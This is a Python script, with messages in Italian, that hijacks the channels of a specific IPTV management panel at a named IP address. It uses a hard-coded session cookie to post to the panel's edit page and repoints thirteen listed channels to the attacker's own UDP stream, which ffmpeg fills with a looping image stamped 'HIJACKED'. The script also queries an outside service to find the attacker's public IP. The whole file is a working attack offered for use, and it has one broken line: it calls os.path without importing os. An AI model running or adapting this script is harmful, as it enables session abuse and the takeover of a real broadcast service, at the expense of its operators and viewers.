#!/usr/bin/env python3


import subprocess
import threading
import time
import socket
import requests
import sys

TARGET = "185.22.183.148:8085"
COOKIE = "PHPSESSID=rk9a4s6ub06m8l1fei8jrmop02"
UDP_PORT = 1234
PNG_FILE = "pat.png"

def get_public_ip():
    ip = subprocess.check_output(["curl", "-s", "ifconfig.me"]).decode().strip()
    print(f"IP PUBBLICO: {ip}:{UDP_PORT}")
    return ip

def start_udp_listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"UDP LISTENER {port} READY")
    while True:
        data, addr = sock.recvfrom(65535)
        print(f"TV SERVER CONNECT: {addr} -> {len(data)} bytes")

def start_png_stream(ip, port, png):
    cmd = [
        'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', png,
        '-vf', f"scale=1280:720,drawtext=text='HIJACKED {ip}':fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf:fontsize=48:fontcolor=white@0.8:x=(w-text_w)/2:y=h-80",
        '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency',
        '-f', 'mpegts', f'udp://0.0.0.0:{port}'
    ]
    print("PNG STREAM START")
    subprocess.Popen(cmd)

def hijack_channel(ch_id, orig_source, ip):
    url = f"http://{TARGET}/edit.php"
    data = {
        'ch': ch_id,
        'source': f"udp://{ip}:{UDP_PORT}",
        'name': f"TRUSTEDF57_{ch_id}",
        'submit': 'Save'
    }
    headers = {'Cookie': COOKIE}
    
    r = requests.post(url, data=data, headers=headers, timeout=10)
    hls_url = f"http://{TARGET}/media/hls_183_148/TRUSTEDF57_{ch_id}/playlist.m3u8"
    
    print(f"[{ch_id}] {orig_source[:40]}... -> {hls_url} | STATUS: {r.status_code}")
    return hls_url

def main():
    if not os.path.exists(PNG_FILE):
        print(f"ERRORE: {PNG_FILE} non trovato!")
        sys.exit(1)
    
    ip = get_public_ip()
    MALICIOUS_UDP = f"udp://{ip}:{UDP_PORT}"
    
    # THREADS
    threading.Thread(target=start_udp_listener, args=(UDP_PORT,), daemon=True).start()
    time.sleep(2)
    threading.Thread(target=start_png_stream, args=(ip, UDP_PORT, PNG_FILE), daemon=True).start()
    time.sleep(5)
    
    # CANALI ESATTI DALLA DASHBOARD
    channels = [
        ("1", "udp://233.166.172.91:1234"),
        ("2", "udp://233.166.172.85:1234"),
        ("5", "http://by13.cdn.mediadelivery.tv:8758/"),
        ("6", "udp://233.166.173.34:1234"),
        ("7", "udp://233.166.172.183:1234"),
        ("8", "udp://233.166.172.212:1234"),
        ("9", "http://10.185.185.202:2128/85.112.114.14-5052/cuctemko_774119691-590"),
        ("10", "http://10.185.185.202:2128/85.112.114.14-5052/cuctemko_774119691-1499"),
        ("11", "http://10.185.185.202:2128/85.112.114.14-5052/cuctemko_774119691-52"),
        ("12", "udp://233.166.172.210:1234"),
        ("13", "http://example.com/13"),
        ("14", "http://example.com/14"),
        ("15", "udp://233.166.173.39:1234")
    ]
    
    print("\n💥 HIJACK IN CORSO...")
    for ch_id, orig_source in channels:
        hls = hijack_channel(ch_id, orig_source, ip)
        time.sleep(1)  # Rate limit
    
    print("\n🎥 HLS OUTPUTS:")
    for ch_id, _ in channels:
        print(f"http://{TARGET}/media/hls_183_148/TRUSTEDF57_{ch_id}/playlist.m3u8")
    
    print("\n✅ TUTTO FATTO. APRI VLC.")

if __name__ == "__main__":
    main()
